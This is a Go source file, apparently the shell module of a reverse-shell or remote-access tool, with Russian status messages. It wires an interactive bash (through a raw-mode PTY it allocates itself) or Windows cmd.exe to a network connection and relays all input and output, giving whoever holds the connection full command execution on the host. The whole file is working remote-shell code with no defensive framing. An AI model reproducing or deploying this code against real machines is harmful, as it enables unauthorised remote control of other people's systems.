package core

import (
    "fmt"
    "net"
    "os"
    "os/exec"
    "runtime"
    "syscall"
    "time"
    "unsafe"
)

type Shell struct {
    conn net.Conn
    cmd  *exec.Cmd
}

func NewShell(conn net.Conn) *Shell {
    return &Shell{conn: conn}
}

func (s *Shell) Run() {
    if runtime.GOOS == "windows" {
        s.runWindows()
    } else {
        s.runUnix()
    }
}

func (s *Shell) runUnix() {
    cmd := exec.Command("/bin/bash")
    s.cmd = cmd
    
    f, err := s.createPTY(cmd)
    if err != nil {
        fmt.Println("[-] Ошибка создания PTY:", err)
        return
    }
    defer f.Close()
    
    err = cmd.Start()
    if err != nil {
        fmt.Println("[-] Ошибка запуска шелла:", err)
        return
    }
    
    s.conn.SetReadDeadline(time.Time{})
    
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := s.conn.Read(buf)
            if n > 0 {
                if _, writeErr := f.Write(buf[:n]); writeErr != nil {
                    return
                }
            }
            if err != nil {
                return
            }
        }
    }()
    
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := f.Read(buf)
            if n > 0 {
                if _, writeErr := s.conn.Write(buf[:n]); writeErr != nil {
                    return
                }
            }
            if err != nil {
                return
            }
        }
    }()
    
    err = cmd.Wait()
    if err != nil {
        fmt.Println("[*] Шелл завершился с ошибкой:", err)
    } else {
        fmt.Println("[*] Шелл завершился")
    }
    s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}

func (s *Shell) runWindows() {
    cmd := exec.Command("cmd")
    s.cmd = cmd
    
    stdin, err := cmd.StdinPipe()
    if err != nil {
        fmt.Println("[-] Ошибка создания stdin pipe:", err)
        return
    }
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        fmt.Println("[-] Ошибка создания stdout pipe:", err)
        return
    }
    stderr, err := cmd.StderrPipe()
    if err != nil {
        fmt.Println("[-] Ошибка создания stderr pipe:", err)
        return
    }
    
    err = cmd.Start()
    if err != nil {
        fmt.Println("[-] Ошибка запуска шелла:", err)
        return
    }
    
    s.conn.SetReadDeadline(time.Time{})
    
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := s.conn.Read(buf)
            if n > 0 {
                if _, writeErr := stdin.Write(buf[:n]); writeErr != nil {
                    return
                }
            }
            if err != nil {
                return
            }
        }
    }()
    
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := stdout.Read(buf)
            if n > 0 {
                if _, writeErr := s.conn.Write(buf[:n]); writeErr != nil {
                    return
                }
            }
            if err != nil {
                return
            }
        }
    }()
    
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := stderr.Read(buf)
            if n > 0 {
                if _, writeErr := s.conn.Write(buf[:n]); writeErr != nil {
                    return
                }
            }
            if err != nil {
                return
            }
        }
    }()
    
    err = cmd.Wait()
    if err != nil {
        fmt.Println("[*] Шелл завершился с ошибкой:", err)
    } else {
        fmt.Println("[*] Шелл завершился")
    }
    s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}

func (s *Shell) createPTY(cmd *exec.Cmd) (*os.File, error) {
    f, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
    if err != nil {
        return nil, fmt.Errorf("не удалось открыть /dev/ptmx: %v", err)
    }
    
    var num int
    _, _, errno := syscall.Syscall(
        syscall.SYS_IOCTL,
        f.Fd(),
        syscall.TIOCGPTN,
        uintptr(unsafe.Pointer(&num)),
    )
    if errno != 0 {
        f.Close()
        return nil, fmt.Errorf("ошибка TIOCGPTN: %v", errno)
    }
    
    var unlock int = 0
    _, _, errno = syscall.Syscall(
        syscall.SYS_IOCTL,
        f.Fd(),
        syscall.TIOCSPTLCK,
        uintptr(unsafe.Pointer(&unlock)),
    )
    if errno != 0 {
        f.Close()
        return nil, fmt.Errorf("ошибка разблокировки PTY: %v", errno)
    }
    
    slaveName := fmt.Sprintf("/dev/pts/%d", num)
    slave, err := os.OpenFile(slaveName, os.O_RDWR, 0)
    if err != nil {
        f.Close()
        return nil, fmt.Errorf("не удалось открыть %s: %v", slaveName, err)
    }
    
    err = s.setTerminalSize(slave.Fd(), 24, 80)
    if err != nil {
        f.Close()
        slave.Close()
        return nil, fmt.Errorf("ошибка установки размера: %v", err)
    }
    
    err = s.setRawTerminal(slave.Fd())
    if err != nil {
        f.Close()
        slave.Close()
        return nil, fmt.Errorf("ошибка настройки терминала: %v", err)
    }
    
    cmd.Stdin = slave
    cmd.Stdout = slave
    cmd.Stderr = slave
    
    cmd.SysProcAttr = &syscall.SysProcAttr{
        Setsid:  true,
        Setctty: true,
        Ctty:    0,
    }
    
    return f, nil
}

func (s *Shell) setTerminalSize(fd uintptr, rows, cols int) error {
    ws := struct {
        Row    uint16
        Col    uint16
        Xpixel uint16
        Ypixel uint16
    }{
        Row:    uint16(rows),
        Col:    uint16(cols),
        Xpixel: 0,
        Ypixel: 0,
    }
    _, _, errno := syscall.Syscall(
        syscall.SYS_IOCTL,
        fd,
        syscall.TIOCSWINSZ,
        uintptr(unsafe.Pointer(&ws)),
    )
    if errno != 0 {
        return fmt.Errorf("ошибка TIOCSWINSZ: %v", errno)
    }
    return nil
}

func (s *Shell) setRawTerminal(fd uintptr) error {
    var termios syscall.Termios
    _, _, errno := syscall.Syscall(
        syscall.SYS_IOCTL,
        fd,
        syscall.TCGETS,
        uintptr(unsafe.Pointer(&termios)),
    )
    if errno != 0 {
        return fmt.Errorf("ошибка TCGETS: %v", errno)
    }
    
    termios.Lflag &^= syscall.ICANON | syscall.ISIG
    termios.Lflag |= syscall.ECHO
    termios.Iflag &^= syscall.IXON
    termios.Cflag |= syscall.CS8
    
    _, _, errno = syscall.Syscall(
        syscall.SYS_IOCTL,
        fd,
        syscall.TCSETS,
        uintptr(unsafe.Pointer(&termios)),
    )
    if errno != 0 {
        return fmt.Errorf("ошибка TCSETS: %v", errno)
    }
    return nil
}
